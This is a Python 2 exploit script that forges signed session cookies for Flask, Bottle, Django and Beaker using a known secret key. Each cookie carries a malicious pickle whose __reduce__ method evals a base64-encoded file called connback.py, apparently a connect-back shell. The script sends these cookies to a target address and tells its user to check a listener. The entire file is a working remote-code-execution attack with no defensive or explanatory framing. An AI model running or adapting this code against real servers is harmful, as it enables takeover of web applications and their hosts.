import os, hashlib, sys, pickle
import requests, subprocess
from hmac import new as hmac
from base64 import b64encode as b64
    
payload = b64(open('connback.py').read())

class ex(object):
    def __reduce__(self):
        return ( eval, ('str(eval(compile("%s".decode("base64"),"q","exec"))).strip("None")'%(payload),) )

def send_flask(key, add, payload):
    data = 'id='+b64(payload)
    mac = b64(hmac(key, '|'+data, hashlib.sha1).digest())
    s = '%(sig)s?%(data)s' % {'sig':mac, 'data':data}
    print requests.get(add, cookies={'session':s})

def send_bottle_cookie(key, add, payload, cookie):
    data = b64(payload)
    mac = b64(hmac(key, data).digest())
    s = '!%(sig)s?%(data)s' % {'sig':mac, 'data':data}
    print requests.get(add, cookies={cookie:s})

def send_django(key, add, payload):
    def base64(s): #taken from django
        import base64
        return base64.urlsafe_b64encode(s).strip(b'=')

    def salted_hmac(salt, value, secret): #taken from django
        key = hashlib.sha1((salt + secret).encode('utf-8')).digest()
        return hmac(key, msg=value, digestmod=hashlib.sha1).digest()

    import time
    import baseconv #taken from django

    timestamp = baseconv.base62.encode(str(int(time.time())))
    data = base64(payload)+":"+timestamp
    mac = base64(salted_hmac('django.contrib.sessions.backends.signed_cookiessigner', data, key)) #default salt by django
    s = '%(payload)s:%(time)s:%(mac)s'%{'payload':base64(payload), 'time':timestamp, 'mac':mac}
    print requests.get(add, cookies={'sessionid':s})

def send_beaker_noncrypt(key, add, payload):
    data = b64(payload)
    mac = hmac(key, data.encode('UTF-8'), hashlib.sha1).hexdigest()
    s = mac + data
    print requests.get(add, cookies={'beaker.session.id':s})

def send_beaker_encrypt(validate_key, add, payload, encrypt_key):
    from beaker import crypto #yes we need it, will port it when we have time
    nonce = '12345678' #anything 8 bytes
    encrypt_key = crypto.generateCryptoKeys(encrypt_key, validate_key + nonce, 1)
    data = nonce + b64(crypto.aesEncrypt(payload, encrypt_key))
    mac = hmac(validate_key, data.encode('UTF-8'), hashlib.sha1).hexdigest()
    s = mac + data
    print requests.get(add, cookies={'beaker.session.id':s})

if len(sys.argv)<3:
    print "Usage:",sys.argv[0],"SECRET_KEY","address"
    sys.exit(0)

SECRET_KEY = sys.argv[1]
ADD = sys.argv[2]

print 'Sending payload, check you listenner'
p = pickle.dumps(ex())
#send_flask(SECRET_KEY, ADD, p)
#send_bottle_cookie(SECRET_KEY, ADD, p, 'abcd')
#send_beaker_encrypt(SECRET_KEY, ADD, p, 'encrypt-key')
#send_django(SECRET_KEY, ADD, p)
